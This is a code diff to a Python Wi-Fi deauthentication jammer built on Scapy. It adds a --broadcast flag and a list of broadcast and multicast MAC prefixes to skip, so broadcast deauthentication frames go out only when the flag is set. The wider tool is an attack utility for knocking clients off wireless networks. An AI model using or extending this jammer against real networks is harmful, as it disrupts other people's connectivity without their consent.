@@ -28,6 +28,8 @@ class JAMMER:
 	__FORGERS      = []
 	__ONRUN        = []
 
+	EXCEPTION      = ('ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:')
+
 	def __init__(self, prs):
 		self.interface = prs.interface
 		self.channel   = prs.channel
@@ -38,7 +40,11 @@ class JAMMER:
 		self.code      = prs.code
 		self.delay     = prs.delay
 		self.packets   = prs.packets
+		self.broadcast = prs.broadcast
 		self.verbose   = prs.verbose
+
+		if self.broadcast:
+			self.EXCEPTION.remove('ff:ff:ff:ff:ff:ff')
 
 	def extract_essid(self, layers):
 		essid = ''
@@ -89,6 +95,10 @@ class JAMMER:
 		pkt = self.forge(sender, receiver)
 		essid = self.get_ess(sender, receiver)
 		
+		for bss in self.EXCEPTION:
+			if sender.startswith(bss) or receiver.startswith(bss):
+				return
+
 		if pkt not in self.__ONRUN:
 			self.__ONRUN.append( pkt )	
 			pull.print("*",
@@ -175,7 +185,8 @@ class JAMMER:
 				self.__ACCESSPOINTS.append(
 						toappend
 					)
-				self.deauthenticate( macaddr, "ff:ff:ff:ff:ff:ff" )
+				if self.broadcast:
+					self.deauthenticate( macaddr, "ff:ff:ff:ff:ff:ff" )
 		elif pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2 and not pkt.haslayer(EAPOL):
 			sender   = pkt.getlayer(Dot11FCS).addr2
 			receiver = pkt.getlayer(Dot11FCS).addr1
@@ -223,6 +234,7 @@ class PARSER:
 		self.delay     = opts.delay if opts.delay >= 0 else pull.halt("Invalid Delay Between Requests", True, pull.RED)
 		self.packets   = opts.packets if opts.packets > 0 else pull.halt("Packets Must Be greater than 0", True, pull.RED)
 		self.verbose   = opts.verbose
+		self.broadcast = opts.broadcast
 		self.signal    = signal.signal(signal.SIGINT, self.handler)
 
 	def handler(self, sig, fr):
@@ -342,6 +354,7 @@ def main():
 	parser.add_argument('--code'           , dest="code"     , default=7 , type=int)
 	parser.add_argument('--delay'          , dest="delay"    , default=0.1 , type=int)
 	parser.add_argument('--packets'        , dest="packets"  , default=1, type=int)
+	parser.add_argument('--broadcast'      , dest="broadcast", default=False, action="store_true")
 	parser.add_argument('--verbose'        , dest="verbose"  , default=False, action="store_true")
 
 	options = parser.parse_args()
